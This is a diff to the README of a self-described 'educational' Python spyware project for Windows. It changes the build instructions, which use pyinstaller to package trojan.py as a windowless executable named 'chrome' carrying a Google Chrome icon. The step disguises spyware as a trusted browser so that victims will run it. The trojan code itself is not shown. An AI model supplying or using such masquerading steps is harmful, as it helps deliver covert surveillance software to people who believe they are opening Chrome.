@@ -4,7 +4,7 @@ And it is used ONLY FOR EDUCATIONAL PURPOSES: a Python-based spyware for Windows
 
 ## To create the .exe file
 
-Run this command after inserting local path to trojan.py file  `pyinstaller --noconfirm --onefile --windowed --icon "C:/Users/omerp/Documents/troj-project/Google-Chrome-Google-Chrome.ico" --name "chrome"  "<insert-full-path>/trojan.py"`
+Run this command after inserting local path to trojan.py file  `pyinstaller --noconfirm --onefile --windowed --icon "<path-to-project>/troj-project/resources/Google-Chrome-Google-Chrome.ico" --name "chrome"  "<insert-full-path>/trojan.py"`
 
 ## Design
 
